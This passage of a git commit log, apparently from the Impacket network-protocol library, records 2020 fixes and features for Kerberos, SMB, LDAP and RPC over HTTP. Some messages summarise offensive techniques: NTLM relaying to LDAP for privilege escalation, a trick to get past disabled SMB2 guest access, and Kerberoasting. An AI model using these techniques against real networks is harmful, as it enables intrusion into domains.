    - required is supported in Python 3.7+

commit 1573f7b9cc4980235b8e08c446fd0ed9c6cf47a3
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 19 12:43:46 2020 -0300

    Fixing test case for Python 3.6

commit f0e847d7e801116fb4e8698f6f0226de628e7bdd
Merge: 257dc19c 8baf5596
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 19 11:46:13 2020 -0300

    Merge branch 'exchanger' of https://github.com/ptswarm/impacket into ptswarm-exchanger

commit 257dc19c7fdb36fea558872487ca0bfed324276e
Merge: 9c621a7d 3ec59074
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Aug 19 11:45:26 2020 -0300

    Merge pull request #922 from rmaksimov/fix-des-padding-bug
    
    fix DES-CBC-MD5 padding bug

commit 9c621a7dd0872918239d9f2aa943e3f2dd40e7c3
Merge: 1c893884 d8359e6f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Aug 19 09:51:36 2020 -0300

    Merge pull request #921 from rmaksimov/bug-krb-etype-switching
    
    fix issue with switching to RC4

commit 3ec59074ec35c06bbd4312d1042f0e23f4a1b41f
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Wed Aug 19 03:16:26 2020 +0300

    fix DES-CBC-MD5 padding bug

commit d8359e6fa0e1d41f925ad8a0708f0c891db13144
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Wed Aug 19 01:21:43 2020 +0300

    fix issue with switching to RC4

commit 963508ecf14d1b8927f388531f18dfe762290760
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Fri Aug 14 15:51:42 2020 +0300

    Add smbpasswd.py script

commit 1c893884e6aef29c4dcaac7f9fbb30f631b30dc5
Merge: 110b886c be64aa28
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Aug 13 22:19:56 2020 -0300

    Merge pull request #883 from spinenkoia/fix_hElfrReadELW_seek
    
    dcerpc: replace default readFlags to EVENTLOG_SEEK_READ #882

commit 2d874dc91715b6c8708e2158dc7e3108ed0deb04
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Mon Aug 10 01:48:58 2020 +0300

    Changing SANs in the output to the Impacket format

commit 872ac0e29a91c10778f1686e7f31489f53d268d1
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Mon Aug 10 01:17:36 2020 +0300

    Changing SPNs to SANs in GetUserSPNs.py as it's more reliable

commit c2837a135cf5c2ae180098bcf4ed19e50736bafb
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Mon Aug 10 00:24:53 2020 +0300

    Adding -usersfile flag to GetUserSPNs.py
    
    * Added -usersfile flag to GetUserSPNs.py
    * Handling of -usersfile flag in GetNPUsers.py is moved higher to skip unnecessary connections to SMB (BTW, it's weird that the script connects to SMB in Kerberoasting)

commit bbae145c1f8dde45fff7958e3c3cef8d1445f6f1
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Aug 9 23:50:35 2020 +0300

    Changing sizeLimit in GetUserSPNs.py

commit 336ee45c9ddae2f2430e77768fde6d2d0f921ba3
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Aug 9 23:47:07 2020 +0300

    Adding new Principal Name Types

commit 110b886c2d8de880d891da5914827ad9df1bc024
Merge: 48a3124c 919055c0
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Aug 4 14:53:12 2020 -0300

    Merge pull request #915 from mohemiv/ndr-bugfixes
    
    NDR Parser Optimization Bugfixing

commit 501859c398b4088e76140bf89a19d632625ac9cd
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Tue Aug 4 20:49:55 2020 +0300

    Enforcing RPC_C_AUTHN_LEVEL_PKT_PRIVACY for atexec.py

commit 919055c0fe734fd324a0291c06a8a36dfe869f18
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Tue Aug 4 20:21:13 2020 +0300

    Fixing a bug appeared after the optimization of NDR parser

commit 8baf55962a654c1a1ed459a5e0419b898248c711
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Jul 30 18:02:05 2020 +0300

    Fixing Travis CI tests

commit b97fdef3daafc2a3b736cfe4cfe5712d81f1be96
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Jul 30 17:41:52 2020 +0300

    Adding tests for MS-RPCH

commit 207a6f8b0f14a7572d190e6afc89ab42907c398b
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Jul 30 15:44:18 2020 +0300

    Final changes for exchanger.py

commit e59ff693873e4478ba196b683a7a126998bce90b
Author: Romain Carnus <romain.carnus@gmail.com>
Date:   Wed Jul 29 11:44:22 2020 -0400

    httpRelayServer: read body content for POST requests
    
    Web clients receiving a 401 Unauthorized header as a response, depending
    on the Keep-alive header, may authenticate inside the same TCP stream,
    or close the first one and open another.
    In the first case, if the client was sending a POST request with data in
    the content body, the content body was parsed by handle_one_request()
    as a new (invalid) request, thus causing an issue with the parsing of the following
    request where the Authorization header was actually presented.

commit 48a3124c43d2242d6a336796cb50855ba93b23b2
Author: asolino <bethus@gmail.com>
Date:   Tue Jul 28 23:01:51 2020 -0300

    Enforce RPC_C_AUTHN_GSS_NEGOTIATE when using Kerberos.
    
    Should help on https://github.com/SecureAuthCorp/impacket/pull/739#issuecomment-665363963

commit f89b49e2f5eeacac3a7448f960d360debfc11baa
Author: asolino <bethus@gmail.com>
Date:   Tue Jul 28 22:13:21 2020 -0300

    Fail gracefully if we can't get the LSA values we need
    
    Should make it easier to spot https://github.com/SecureAuthCorp/impacket/issues/908

commit 39ef03811344113ef36ab8fe7dd999cb0d0cac21
Author: asolino <bethus@gmail.com>
Date:   Tue Jul 28 21:23:19 2020 -0300

    Adding -no-pass, pass-the-hash and AES Key support for backup subcommand
    
    Addresses https://github.com/SecureAuthCorp/impacket/issues/804

commit 7786ba017071c68191dffd4b432c001e147d5e25
Merge: 23510be8 b39690fe
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jul 28 18:29:11 2020 -0300

    Merge pull request #859 from mohemiv/ndr
    
    NDR Parser Optimization

commit 23510be8d2ff26e70a3568fcb1033b15c247ddda
Merge: 1e84ad60 ff653829
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jul 28 13:50:05 2020 -0300

    Merge pull request #907 from 0xdeaddood/master
    
    Fix decryptHash for not VistaStyle hashes

commit ff6538297f88d00962f4bd44964943359a39b0ec
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Tue Jul 28 12:11:58 2020 -0300

    Fix decryptHash for not VistaStyle hashes

commit 28098805b8f1fa76913ae2bc103991af5d0e2dde
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Jul 23 11:46:17 2020 +0300

    Adding exchanger.py

commit f95712a3f3df07234642b8d2e1d83639d5b592e6
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Jul 19 21:31:36 2020 +0300

    Adding new protocols to RPC UUIDs database

commit 9a678ee759a17a78da963ea215ef4947ca65410a
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Fri Jul 17 20:25:05 2020 +0300

    Bugfixing MS-RPCH

commit 1e84ad6049197ee15d31dc077c25415f90a61683
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 13 10:09:28 2020 -0300

    Setting plainText variable to b'' for not VistaStyle hashes.
    
    Shoud address https://github.com/SecureAuthCorp/impacket/issues/902

commit 8e387f99c3fd3e9dedaa2e773d9c95116878e3f4
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Mon Jul 13 02:29:33 2020 +0300

    Update transport.py
    
    This is better than swapping TCPTransport and RPCProxyClient

commit 87cd317548e31a63e979930e70b7b8de734c8f43
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Mon Jul 13 01:37:42 2020 +0300

    Added a description about ACLs to MS-RPCH impl

commit 2208853a3b281c6f4db5f779adbad828d956f3dd
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Mon Jul 13 00:22:03 2020 +0300

    Added parse_bitmask function to structure.py
    
    In the future we can add a parameter to get a wireshark formatted output

commit 1639b2fe92044616d85c2f6d8ad9fdc369a5d642
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Sun Jul 12 23:34:32 2020 +0300

    Update README.md

commit 84d579d4b9cf5ff878e70c0c82f3c88b31d4cc9c
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Jul 12 23:29:43 2020 +0300

    Added missing import to rpcmap.py

commit c8a3be3d72546c7bc69d736226deea00f6d06d34
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Jul 12 22:30:02 2020 +0300

    Changing -auth-rpcproxy function to -auth-transport in rpcmap.py and modifying the code to suit the new MS-RPCH impl
    
    + Now it's possible to specify different credentials for SMB and RPC
    + RPC Proxy errors are handled by constants from its implementation
    
    The downside of this commit is it removes Kerberos support.
    
    Current SMB and RPC libraries depend too much on each other,
    we need to make some changes for them to get an ability to use different credentials and
    different security providers on both levels, and add a support to make reconenctions with
    proper socket handeling, and saving security configuration.
    
    Probably removing Kerberos is not a big deal, as rpcmap.py is usually used in research purposes.

commit c930648390509a622082a10253b3fcb0a39d8d47
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Jul 12 20:57:21 2020 +0300

    Added important TODO to rpcmap.py
    
    For now rpcmap.py leaves a lot of socket after itself, and
    to get it work the correct way without stupid workarounds it
    will require change some code in the library

commit 1eabde7b67509c610aec8fd36dda53f17854edcd
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Jul 12 20:51:37 2020 +0300

    Added -brute-versions function to rpcmap.py

commit dca83b487beb037e0a616279ae3b358a4b127250
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Jul 12 20:32:17 2020 +0300

    Fixing a bug in rpcmap.py
    There was no way to bruteforce UUIDs on ncacn_ip_tcp endpoints with empty credentials because of the lockout protection

commit ca9236f148ed7b26139506562a8ad24403e47cf0
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Jul 12 20:11:23 2020 +0300

    Changing rpcdump.py to suit a new MS-RPCH impl

commit 65581403841013ee88b36aa89e32053a57fad0ee
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Jul 12 17:41:24 2020 +0300

    Huge update of MS-RPCH implementation
    
    + Bug fixing
    + Added Basic authentication support
    + Added RPC over HTTP v2 Flow control support
    + Removed all the code that relied on TCP layer to determine HTTP boundaries
    + Added support for UTF-8 server erros
    + Security stuff moved to a different file
    + Tested on 20+ different targets

commit 865f4e0396ef6057ccb515f297141ea44284dc22
Author: 001 <001@sopranos.net>
Date:   Sun Jul 12 14:40:41 2020 +0300

    Fixed dcomrt.py MinorVersion Problem

commit 7e8a0d008d4c88d4e7dddb55f9e31ac8150fcba9
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri Jul 10 19:54:15 2020 +0300

    Adding MS-NSPI / MS-OXNSPI implementation

commit 01235be574abf317d874dff6b650205f2277a5ce
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri Jul 10 19:50:26 2020 +0300

    Adding support of a new UUID format to uuid.py

commit e92f49b6684ca3a9f06629dbb7e6aa5f4ddfb373
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri Jul 10 19:40:41 2020 +0300

    Small name changing in MS-OXABREF

commit 3546a3ee2b1f9df7705af1a00bf85e10a38396b4
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri Jul 10 19:38:32 2020 +0300

    Adding NSPI / OXNSPI / MAPI errors and constants

commit feb0589049bb80283fe7303a20772b456e33eb74
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri Jul 10 19:35:05 2020 +0300

    Adding MS-OXABREF implementation

commit 98d231e1215de3b8b8b36b2815f60d83321d3a88
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri Jul 10 19:26:16 2020 +0300

    Adding new structures and helpers to MS-RPCH impl

commit a815da67c93e3a89a2e4315216fbacd9b616b2f3
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri Jul 10 19:16:27 2020 +0300

    Adding handling of rare RPC Proxy errors to MS-RPCH impl
    
    For now I'm adding the code to check nt_errors.py, but I didn't see RPC Proxies returning any errors from this file except those we added in the previous commit.

commit b0449870bb6e1e20164e911a7fe7e1f2a5dc621d
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri Jul 10 19:14:46 2020 +0300

    Adding rare RPC Proxy errors to nt_errors.py

commit c79997ec3e8286b078d211d7dcb2ee2f5e6ef6ec
Merge: 5d4ad6cc b39690fe
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Tue Jul 7 20:50:11 2020 +0300

    Merge pull request #1 from mohemiv/ndr
    
    Optimizing NDR parser to work with large-sized RPC results

commit 679d90cffeed2cfd91cd5c9c233f31b39e6a7d4e
Author: Romain Carnus <romain.carnus@gmail.com>
Date:   Tue Jul 7 11:48:22 2020 -0400

    ldapattack: fix error when trying to escalate with machine account
    
    When relaying to ldap/ldaps and trying to escalate with a machine
    account, the machine account is found by getUserInfo() but not by
    aclAttack(). aclAttack assumes that the objectCategory=user which
    machine accounts are not. By being a little more generic,
    objectClass=user will allow to use both categories of objects.

commit 5d4ad6cc26496f6e16e7ec6ab54b631ea98b09c5
Merge: b5c0f175 6faf51d7
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jun 29 14:53:57 2020 -0300

    Merge pull request #891 from mubix/patch-2
    
    Fix for #888 Part 1

commit b5c0f175301335cd05580b67bd0e66b6bb61f8ba
Merge: 5db5e4fa 1bb9e504
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jun 29 14:53:34 2020 -0300

    Merge pull request #892 from mubix/patch-3
    
    Fix for #888 Part 2

commit 1bb9e504bba17319980b08614f9c6e6015dd4420
Author: Rob Fuller <mubix@users.noreply.github.com>
Date:   Mon Jun 29 12:27:51 2020 -0400

    Fix for #888 Part 2

commit 6faf51d7a8fc5cf546b7fa41af1e33161a88bf4a
Author: Rob Fuller <mubix@users.noreply.github.com>
Date:   Mon Jun 29 12:25:29 2020 -0400

    Fix for #888 Part 1

commit 5db5e4facc4795584ac0dcab630d4f6fd196387b
Merge: 560dade4 7f68662d
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jun 24 11:52:40 2020 -0300

    Merge pull request #887 from AaronRobson/issue/#886
    
    fix #886 remove overridden IdentifierAuthority key in RPC_SID.fromCan…

commit 560dade42472f9e14a539a06cfe7d26e7e53a61f
Merge: 760cb1ea ef67d7af
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jun 24 11:37:40 2020 -0300

    Merge pull request #828 from mpgn/master
    
    Fix warning with python3.8

commit 7f68662d48c2b59c658a6cfca3ec8c787dfc0ef4
Author: Aaron Robson <aaron.robson@citrix.com>
Date:   Thu Jun 18 11:32:40 2020 +0100

    fix #886 remove overridden IdentifierAuthority key in RPC_SID.fromCanonical

commit be64aa2899485502e9510b5d82b1c4cf3ab5b096
Author: Спиненко Иван ispinenko@ussc.ru <ispinenko@ussc.ru>
Date:   Wed Jun 17 12:10:36 2020 +0500

    dcerpc: replace default readFlags to EVENTLOG_SEEK_READ #882

commit 760cb1ea3e002c2d0d650b8b05050386735ccfd4
Merge: f4558a10 8a6853c4
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Jun 11 11:16:21 2020 -0300

    Merge pull request #880 from Romounet/kerberos
    
    Kerberos authentication for smb2

commit f4558a10e24bf51fd6410d5c0f80fa087da2e8c4
Merge: b5c61678 5bdc1cb6
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jun 10 17:42:08 2020 -0300

    Merge pull request #873 from IllusiveNetworks-Labs/feature/add_wmi_array_serialization
    
    Improve serialization of wmi method parameters

commit 8a6853c4f5274293798c5e54bbe65735638f6d1e
Author: Romain Carnus <romain.carnus@gmail.com>
Date:   Thu May 14 14:36:33 2020 -0400

    smb3: store Connection.PreAuthIntegrityHashValue
    
    Only the Session.PreAuthIntegrityHashValue is computed and stored.
    
    As described in [MS-SMB2] a Connection.PreAuthIntegrityHashValue must be
    computed and used to initialize the Session.PreAuthIntegrityHashValue
    for all successive sessions.
    This is important in the case of the SMBv3.1.1 dialect as it will allow
    to obtain different signing keys for each session.

commit f164be0f1e2d0a293435a27637a4080339370c3b
Author: Romain Carnus <romain.carnus@gmail.com>
Date:   Thu May 14 11:17:39 2020 -0400

    smb3: Handle mutual auth option for kerberos authentication
    
    When authenticating with kerberos, the mutualAuth option can be
    specified to GSS-API. The option is sent in the AP_REQ message.
    When this is the case, the applicative session key must be retrieved
    from the AP_REP.

commit 23fedb7389c0e36ab7b2c20dcafa758e01db6353
Author: Romain Carnus <romain.carnus@gmail.com>
Date:   Mon Apr 27 17:23:53 2020 -0400

    kerberosv5: return sessionKey with right cipher type in getKerberosTGT
    
    The cipher type of the session key returned by getKerberosTGT is guessed
    upon the cipher type used for encryption of the AS_REP. This may be
    inaccurate and cipher types may be different. It is better to
    return the right cipher type indicated in the deciphered AS_REP.

commit 5bdc1cb6145ad49745b47ce4cc551a12d202d94b
Author: shmul <tshamul@illusivenetworks.com>
Date:   Thu May 21 23:52:02 2020 +0300

    Add serialization of array as input parameter for method call

commit ab75edb9dc95de31cd4cfd2aba0af3c3cbdfd65e
Author: shmul <tshamul@illusivenetworks.com>
Date:   Thu May 21 10:10:38 2020 +0300

    Add handling with WMI object method parameters (in array and regular)

commit 96bef0a3720d03282595eecebf1b73b39034af7e
Author: shmul <tshamul@illusivenetworks.com>
Date:   Tue May 19 23:12:04 2020 +0300

    Add implementation of serialization of string array in method in parameters

commit b5c61678c9ad33629667cbbf35186cf42602b67d
Merge: 874d7ae4 fc466d16
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sun Jun 7 10:01:19 2020 -0300

    Merge pull request #870 from IllusiveNetworks-Labs/feature/issue_787_fix_put_instace_ndtable
    
    Issue 787 - Fix marshaling wmi object's ndTable and handling of defau…

commit 874d7ae4df8551c4fc5095a1e3b7ee5969c6057b
Merge: fe40cb04 5ac17fe3
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Jun 5 13:39:09 2020 -0300

    Merge pull request #871 from mohemiv/patch-1
    
    Adding missing checkNullString call to hSchRpcStop

commit 5ac17fe3b4450006b3f3514344e4e8e8ed016521
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Fri Jun 5 00:00:51 2020 +0300

    Adding missing checkNullString call to hSchRpcStop

commit fc466d16308797f7f59be92e294b02209156ceea
Author: shmul <tshamul@illusivenetworks.com>
Date:   Tue May 19 09:19:43 2020 +0300

    Issue 787 - Fix marshaling wmi object's ndTable and handling of default uint/bool values

commit fe40cb04483dab305f17c29d71db928ac7eb5cf7
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 3 15:29:56 2020 -0300

    Adding disclaimer section, clarifying the spirit of this initiative.

commit 3f1e7ddd0c6e39f0445b8f86870a0194416e6695
Merge: 525fa3d0 b5b9ca81
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed May 20 12:05:26 2020 -0300

    Merge pull request #857 from mohemiv/master
    
    Added Relaying to RPC support

commit 525fa3d08cc6f274bbfaeafad861dde3e5bd917a
Merge: 9a4b3f52 ee61f9d3
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon May 18 09:20:28 2020 -0300

    Merge pull request #858 from fuzzKitty/master
    
    Fixed missing byte literal and deprecated getheader

commit ee61f9d349106d1c05959dfd579a3b883027a690
Author: fuzzKitty <shlomo@fuzzkitty.com>
Date:   Mon May 18 14:33:09 2020 +0300

    Added python2 support
    
    Added python2 support

commit 8ac3c66a2b14388169b9ad07a599e568ff8a8077
Author: fuzzKitty <shlomo@fuzzkitty.com>
Date:   Mon May 18 13:00:12 2020 +0300

    Replaced deprecated getheader() with get()
    
    Replaced deprecated getheader() with get()

commit b39690fe84090127fcde1bb09e7eb07f10d46f81
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Mon May 18 04:49:08 2020 +0300

    NDR Parser Optimization Bug Fixing

commit 1e8fc7cc1fb5bf25c4a2d4a3b69420828007ae79
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Mon May 18 04:32:56 2020 +0300

    NDR Parser Optimization Bug Fixing

commit f5fdbc67ab43b801c992e69fa3e910f16f0dd05a
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Mon May 18 04:32:01 2020 +0300

    NDR Parser Optimization Bug Fixing

commit 29a525fda79ebc2365d1e1f2c71b2f3d3fe4068e
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Mon May 18 03:39:26 2020 +0300

    NDR Parser Optimization

commit 8a6e9e2c4947cbc47f1346cc290ca53d92bab71c
Author: fuzzKitty <shlomo@fuzzkitty.com>
Date:   Sun May 17 10:09:44 2020 +0300

    Fixed missing byte literal
    
    Missing byte literal string annotation added.

commit b5b9ca817b6a1238edfab98784062e4a38090f79
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri May 15 04:27:26 2020 +0300

    Added Reaying to RPC support

commit 9a4b3f5267d91ba8bfd55b8e00390916cd154bbd
Merge: 96c7a512 6c2b061a
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed May 13 10:14:03 2020 -0300

    Merge pull request #855 from rmaksimov/fix-kerberos-in-getnpusers
    
    fix #809

commit 6c2b061a659d575eda01cea554c6329fe40a9b41
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Wed May 13 14:42:22 2020 +0300

    fix #809 issue with Kerberos in GetNPUsers.py

commit cfe14a87419280eb0d9714ec013a55dae2a0ca9e
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Mon Apr 27 03:50:04 2020 +0300

    fix string formatting

commit db2b13e0c9768b2704b1064c109391de67bd2d65
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Mon Apr 27 03:30:14 2020 +0300

    add -dc-host option

commit 96c7a5124f26666a1d55b7c282cb944cd1672663
Merge: c44901d1 a1d2b978
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Apr 28 19:12:54 2020 -0300

    Merge pull request #840 from ThePirateWhoSmellsOfSunflowers/fix_pagedresults_control
    
    fix the ldap search with paged results

commit a1d2b978a7dc986d4a6c17a17f9ec170b2e298af
Author: ThePirateWhoSmellsOfSunflowers <ThePirateWhoSmellsOfSunflowers@users.noreply.github.com>
Date:   Mon Apr 27 21:36:33 2020 +0200

    fix the comparison for paged results

commit 5d75530d1b82ab3d0c58a88feeb298ec8e7751ff
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Mon Apr 27 02:48:58 2020 +0300

    add SMB timeout handling

commit c44901d14f19e444fa19a8c23481f94686062a0f
Merge: 23bbfbe1 9f69ffaa
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Apr 24 15:05:28 2020 -0300

    Merge pull request #835 from 0xdeaddood/NTLMrelay_fixes
    
    Ntlmrelay.px fixes

commit 9f69ffaa90693998acb133b5be6173aad13b4f62
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Apr 24 12:50:42 2020 -0300

    Fix relaying over new Windows versions
    Windows 10, version 1709, Windows 10, version 1903, Windows Server,
    version 1709, Windows Server, version 1903, and later versions of
    Windows, have Guest access in SMB2 disabled by default. This commit adds
    a trick to avoid this restriction.

commit f7c09637b763f7a51ce8e2c7f21d6af12bbb5713
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Apr 24 12:42:42 2020 -0300

    Fix errors relaying to LDAP
    Some exploitations or techniques that activate the NTLMrelay, like
    printerbug.py, have special behaviors that affect the correct functioning
    of LDAP attacks. This commit fix an issue related to those incoming
    connections.

commit 23bbfbe112f80e46eba87ea2cc9d6ea1083a08e0
Merge: 62162e0a a682d821
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 22 22:33:59 2020 -0300

    Merge branch 'Romounet-smbserverCreds'

commit a682d8213a593b3b674736e359730ffd3f48841c
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 22 22:32:53 2020 -0300

    Lower casing the username when the creds file directly provided thru the config file.
    
    Related to https://github.com/SecureAuthCorp/impacket/pull/833

commit 006f6e981ef4f76f831650df4eb19d7796321d01
Author: Romain Carnus <romain.carnus@gmail.com>
Date:   Wed Apr 22 18:30:39 2020 -0400

    smbserver.py: check case insensitive NTLM username
    
    Windows usernames are case insensitive. In smbserver credentials are
    stored in the server in the exact manner they are provided by the user and fetched
    using the username provided in the AUTH message as the key of the
    dictionnary. If there is a difference in the case, credentials are not
    found and the authentication fails.

commit ef67d7aff09ac646479f477da3c24d2463cb6b72
Author: mpgn <martial.puygrenier@gmail.com>
Date:   Mon Apr 20 13:18:23 2020 -0400

    Fix warning with python3.8
    
    https://docs.python.org/3.8/whatsnew/3.8.html#changes-in-python-behavior
    
    > The compiler now produces a SyntaxWarning when identity checks (is and is not) are used with certain types of literals (e.g. strings, numbers). These can often work by accident in CPython, but are not guaranteed by the language spec. The warning advises users to use equality tests (== and !=) instead. (Contributed by Serhiy Storchaka in bpo-34850.)

commit 62162e0a1e0b55186ad0517e5b37532a06d9b70c
Merge: 7e505892 1556afa0
Author: asolino <bethus@gmail.com>
Date:   Thu Apr 16 09:18:38 2020 -0300

    Merge branch 'mohemiv-master'

commit 1556afa08b69281817c4152bb09ab6368f11a809
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Wed Apr 15 17:26:21 2020 +0300

    Added support for one of non-standard IIS configuration seen in the wild

commit 49c9312413e6e031a0f70488d4ab534f70a1acab
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Tue Apr 14 01:24:44 2020 +0300

    Small bug fixing related to RPC over HTTP v2 changes

commit 3506a6073690345be36e5a8bd843dd2b0a991faa
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 08:58:17 2020 +0300

    Fixing Travis CI tests after adding RPC over HTTP v2 realization

commit b59bcfaad39f99855987790feacb73d6bcbc33bc
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 08:41:55 2020 +0300

    Changing HTTPTransport::connect method to "more right"

commit 9f6c9137250f75a5980379bfff94f4dc4c4a101f
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 08:10:59 2020 +0300

    Removing non-working code from lookupsid.py

commit abb991572dadd3b5aaedfb3ccba86239355e7628
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 07:33:52 2020 +0300

    Normalizing [domain/]user[:password] regexps to the right one

commit 96b522884f31f68cfff6cda24c2c30827b3b35e8
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 07:19:20 2020 +0300

    Rewriting opdump.py and ifmap.py to rpcmap.py

commit 3b0ff40c1a1755c55cf4ec881ddee9ffda4426a8
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 07:12:40 2020 +0300

    Added missing MSRPC_RTS const

commit a7f470b85e86b8acfbfd4cbbd61bfc218c8187b1
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 07:09:26 2020 +0300

    Added RPC over HTTP v2 support for rpcdump.py

commit e9d7781e97d7b0ae332423fdfab77a58a4faa3c3
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 07:05:07 2020 +0300

    Added RPC over HTTP v2 protocol

commit 070a4a8a0d98f05aa797a9349be6be67af1f2e0d
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 06:53:18 2020 +0300

    Removing misleading code from endpoint mapper client realization
    rpctransport.getRemoteName() could be anything that user specified

commit 5f7ac5c9d7f78742f7a43dd797d9d4f6f5db4b86
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 06:10:00 2020 +0300

    Added support for getting more than 499 endpoints from endpoint mapper

commit e3871f2278180a19411a143965de0ca9886332bb
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 06:03:03 2020 +0300

    Added EMPTY_UUID to uuid.py

commit f15c44deb9073bc09cbdd7939bc4f25befd5ebef
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 06:00:55 2020 +0300

    Small changes in epm.py KNOWN_PROTOCOLS

commit 5ff60a439822e38d711baac3725b3abf1e58da72
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 05:57:20 2020 +0300

    Fixing mistakes related to context_handle_uuid and extending its capabilities

commit bfd42202b43d4fbe8c62c41be2e93273e296e184
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 05:46:41 2020 +0300

    Added stringbinding support for DCERPCTransport

commit c55d629185662d8747b8ae7c38f15f440f09d859
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 05:36:26 2020 +0300

    Extending DCERPCStringBinding capabilities

commit 7e50589280b07ce6814adf97a0492917dc5a6620
Author: asolino <bethus@gmail.com>
Date:   Fri Mar 27 10:38:53 2020 -0300

    And going back to dev version :)

commit 039087dd05ac9ae180360b1559957164a30d9bf6
Author: asolino <bethus@gmail.com>
Date:   Thu Mar 26 15:33:51 2020 -0300

    Updating source tag

commit 5ead52979633653848b3507f9318c54c7e50496e
Author: asolino <bethus@gmail.com>
